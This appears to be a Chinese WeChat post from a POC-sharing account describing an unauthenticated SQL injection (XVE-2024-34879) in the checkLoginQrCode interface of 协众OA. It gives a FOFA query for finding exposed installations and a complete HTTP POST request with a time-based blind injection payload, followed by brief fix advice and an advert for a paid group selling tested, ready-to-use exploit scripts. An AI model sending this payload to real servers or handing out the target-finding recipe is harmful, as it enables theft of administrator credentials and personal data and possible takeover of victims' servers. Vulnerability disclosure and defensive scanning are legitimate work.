#  协众OA checkLoginQrCode SQL注入漏洞(XVE-2024-34879)   
Superhero  nday POC   2025-01-06 03:20  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
协众OA产品，即协众OA管理系统或协众OA办公软件，是一款专业的办公自动化软件，旨在提升企业的工作效率与管理水平，由广州协众科技软件有限公司开发，该公司是一家拥有成熟技术核心及雄厚研发力量的软件开发企业。凭借先进的协同管理理念，广州协众科技软件有限公司自主研发了协同管理产品系列，并通过大量的客户积累和丰富的实践经验，在业界形成了一整套成熟的行业解决方案。被泛应用于金融、教育、制造、零售等多个行业。以酒店行业为例，中山小榄大酒店和佛山富林朗悦酒店等知名企业都选择了协众OA作为他们的协同管理平台。这些企业通过实施协众OA系统，实现了电子化经营管理，提高了工作效率和管理水平。  
**01******  
  
**漏洞概述**  
  
  
协众OA checkLoginQrCode 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
app="协众软件-协众OA"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9emJch0dZEYUUf8DUPITiarW71rVubtRvTF4F9KrJslkFmEZg0DqKUrA/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Priority: u=0, i
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0

id=(select * from (select sleep(5))z)
```  
  
延时8秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9amicIopaCITW5115FeXJcib1NFLFAFiaP2c5aXuS5ic0WZN2eFdHmYV8ug/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9LhZiasbBiaeqDPT5Yh3ZYGRS0nmJALh45Cj6BtA668pYGOY1o7uGLc9g/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9KPN0KMbeUgLUxIerqOmoib20DR7cEdcsx9gmJBsea9ZibXaTqPsdAicNw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLOj9tMBYxek4r1q1gydvD9vH4P2ia5Bolibh0UpMEIj4aljJ0NHDn4sh4JBgic2ia1MO1xj93ACibKmsg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
对用户传入的参数进行限制  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10个左右POC。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
